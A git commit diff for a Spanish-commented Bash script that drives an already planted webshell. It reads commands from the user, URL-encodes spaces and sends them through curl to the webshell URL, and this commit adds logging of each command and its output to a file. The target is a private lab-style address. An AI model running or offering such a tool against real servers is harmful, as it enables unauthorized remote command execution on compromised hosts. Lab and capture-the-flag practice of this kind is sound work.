ad28b294b82158a33b4cbe7c8f1edbc91e540255
Gonzalo Almeida <99911181+GonzaHit@users.noreply.github.com>
2025-02-26 16:12:09 -0300

    Update webshell_navigator.sh

--- webshell_navigator.sh
+++ webshell_navigator.sh
@@ -6,9 +6,12 @@ yellowColour="\e[0;33m\033[1m"
 redColour="\e[0;31m\033[1m"
 endColour="\e[0m"
 
+# Archivo de salida para guardar los resultados
+output_file="webshell_output.txt"
+
 # Función para manejar la salida con Ctrl+C
 function ctrl_c() {
-    echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
+    echo -e "\n\n${redColour}[!] Saliendo... Los resultados se han guardado en $output_file${endColour}\n"
     exit 1
 }
 
@@ -22,6 +25,9 @@ read -p "Introduce la URL base de la webshell (ejemplo: http://172.17.0.2/shell.
 while true; do
     read -p "Introduce el comando a ejecutar (o 'exit' para salir): " comando
 
+    # Reemplazar espacios con '+'
+    comando=$(echo $comando | tr ' ' '+')
+
     if [ "$comando" == "exit" ]; then
         ctrl_c
     fi
@@ -30,6 +36,12 @@ while true; do
     respuesta=$(curl -s "${url_base}${comando}")
 
     # Mostrar la respuesta
-    echo -e "\n${yellowColour}Salida del comando:${endColour}\n"
-    echo -e "${respuesta}\n"
+    if [ -z "$respuesta" ]; then
+        echo -e "\n${redColour}[!] No se encontró nada.${endColour}\n"
+        echo -e "[!] Comando: ${comando}\n[!] Resultado: No se encontró nada.\n" >> $output_file
+    else
+        echo -e "\n${yellowColour}Salida del comando:${endColour}\n"
+        echo -e "${respuesta}\n"
+        echo -e "[+] Comando: ${comando}\n[+] Resultado:\n${respuesta}\n" >> $output_file
+    fi
 done
